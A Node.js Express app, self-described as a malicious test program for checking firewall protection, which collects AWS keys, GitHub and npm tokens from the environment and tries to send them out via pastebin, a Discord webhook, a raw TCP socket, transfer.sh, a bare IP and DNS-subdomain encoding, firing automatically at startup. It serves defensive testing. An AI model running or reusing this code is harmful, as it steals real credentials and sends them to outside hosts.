/**
 * MALICIOUS EXPRESS APP - FOR TESTING FIREWALL
 * This simulates a supply chain attack that attempts data exfiltration
 */

const express = require('express');
const http = require('http');
const https = require('https');
const net = require('net');

const app = express();
const PORT = 3000;

console.log(' MALICIOUS APP STARTING - Testing Firewall Protection');
console.log('');

// Simulated stolen data
const stolenData = {
  env: {
    AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID || 'AKIAIOSFODNN7EXAMPLE',
    AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY || 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    GITHUB_TOKEN: process.env.GITHUB_TOKEN || 'ghp_exampletoken123456789',
    NPM_TOKEN: process.env.NPM_TOKEN || 'npm_exampletoken123456789'
  },
  system: {
    hostname: require('os').hostname(),
    platform: process.platform,
    cwd: process.cwd()
  },
  timestamp: new Date().toISOString()
};

// Attack Vector 1: HTTP POST to pastebin (blocked domain)
function exfiltrateViaPastebin() {
  console.log('\n[ATTACK 1] Attempting to exfiltrate via pastebin.com...');
  
  try {
    const postData = JSON.stringify(stolenData);
    
    const options = {
      hostname: 'pastebin.com',
      port: 80,
      path: '/api/api_post.php',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const req = http.request(options, (res) => {
      console.log(' [ATTACK 1] SUCCESS - Data exfiltrated to pastebin.com');
      res.on('data', (chunk) => {
        console.log(`   Response: ${chunk}`);
      });
    });
    
    req.on('error', (e) => {
      console.log(` [ATTACK 1] BLOCKED - ${e.message}`);
    });
    
    req.write(postData);
    req.end();
  } catch (e) {
    console.log(` [ATTACK 1] BLOCKED - ${e.message}`);
  }
}

// Attack Vector 2: HTTPS to Discord webhook (blocked pattern)
function exfiltrateViaDiscord() {
  console.log('\n[ATTACK 2] Attempting to exfiltrate via Discord webhook...');
  
  const postData = JSON.stringify({
    content: `Stolen credentials: ${JSON.stringify(stolenData.env)}`
  });
  
  const options = {
    hostname: 'discord.com',
    port: 443,
    path: '/api/webhooks/123456789/abcdefghijklmnop',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  
  const req = https.request(options, (res) => {
    console.log(' [ATTACK 2] SUCCESS - Data exfiltrated via Discord');
  });
  
  req.on('error', (e) => {
    console.log(` [ATTACK 2] BLOCKED - ${e.message}`);
  });
  
  req.write(postData);
  req.end();
}

// Attack Vector 3: Raw TCP socket to external IP
function exfiltrateViaRawSocket() {
  console.log('\n[ATTACK 3] Attempting raw TCP socket to external IP...');
  
  const client = new net.Socket();
  
  client.connect(4444, '185.199.108.153', () => { // GitHub IP as example
    console.log(' [ATTACK 3] SUCCESS - Connected to external socket');
    client.write(JSON.stringify(stolenData));
    client.destroy();
  });
  
  client.on('error', (err) => {
    console.log(` [ATTACK 3] BLOCKED - ${err.message}`);
  });
}

// Attack Vector 4: POST to transfer.sh (blocked domain)
function exfiltrateViaTransferSh() {
  console.log('\n[ATTACK 4] Attempting to upload to transfer.sh...');
  
  const postData = JSON.stringify(stolenData);
  
  const options = {
    hostname: 'transfer.sh',
    port: 443,
    path: '/stolen-data.txt',
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  
  const req = https.request(options, (res) => {
    console.log(' [ATTACK 4] SUCCESS - Data uploaded to transfer.sh');
    res.on('data', (chunk) => {
      console.log(`   URL: ${chunk}`);
    });
  });
  
  req.on('error', (e) => {
    console.log(` [ATTACK 4] BLOCKED - ${e.message}`);
  });
  
  req.write(postData);
  req.end();
}

// Attack Vector 5: HTTP to random external IP (not in allowedDomains)
function exfiltrateToRandomIP() {
  console.log('\n[ATTACK 5] Attempting HTTP to random external IP...');
  
  const postData = JSON.stringify(stolenData);
  
  const options = {
    hostname: '93.184.216.34', // example.com IP
    port: 80,
    path: '/exfil',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  
  const req = http.request(options, (res) => {
    console.log(' [ATTACK 5] SUCCESS - Data sent to random IP');
  });
  
  req.on('error', (e) => {
    console.log(` [ATTACK 5] BLOCKED - ${e.message}`);
  });
  
  req.write(postData);
  req.end();
}

// Attack Vector 6: DNS exfiltration simulation (subdomain encoding)
function exfiltrateViaDNS() {
  console.log('\n[ATTACK 6] Attempting DNS exfiltration...');
  
  // Encode data in subdomain
  const encoded = Buffer.from(JSON.stringify(stolenData.env)).toString('base64').substring(0, 50);
  const maliciousDomain = `${encoded}.attacker-dns.com`;
  
  const options = {
    hostname: maliciousDomain,
    port: 80,
    path: '/',
    method: 'GET'
  };
  
  const req = http.request(options, (res) => {
    console.log(' [ATTACK 6] SUCCESS - DNS exfiltration completed');
  });
  
  req.on('error', (e) => {
    console.log(` [ATTACK 6] BLOCKED - ${e.message}`);
  });
  
  req.end();
}

// Express routes
app.get('/', (req, res) => {
  res.json({ 
    message: 'Malicious Express App - Testing Firewall',
    status: 'running',
    note: 'This is a test app that attempts data exfiltration'
  });
});

app.get('/trigger-attacks', (req, res) => {
  console.log('\n TRIGGERING ALL ATTACK VECTORS');
  console.log('');
  
  // Delay attacks slightly to avoid overwhelming
  setTimeout(exfiltrateViaPastebin, 100);
  setTimeout(exfiltrateViaDiscord, 300);
  setTimeout(exfiltrateViaRawSocket, 500);
  setTimeout(exfiltrateViaTransferSh, 700);
  setTimeout(exfiltrateToRandomIP, 900);
  setTimeout(exfiltrateViaDNS, 1100);
  
  res.json({ 
    message: 'Attack vectors triggered - Check console for results',
    attacks: 6
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`\n Server running on http://localhost:${PORT}`);
  console.log(` Trigger attacks: http://localhost:${PORT}/trigger-attacks`);
  console.log('\n');
  
  // Auto-trigger attacks after 2 seconds
  setTimeout(() => {
    console.log('\n AUTO-TRIGGERING ATTACKS IN 2 SECONDS...\n');
    setTimeout(() => {
      console.log(' TRIGGERING ALL ATTACK VECTORS');
      console.log('');
      
      setTimeout(exfiltrateViaPastebin, 100);
      setTimeout(exfiltrateViaDiscord, 300);
      setTimeout(exfiltrateViaRawSocket, 500);
      setTimeout(exfiltrateViaTransferSh, 700);
      setTimeout(exfiltrateToRandomIP, 900);
      setTimeout(exfiltrateViaDNS, 1100);
    }, 2000);
  }, 0);
});
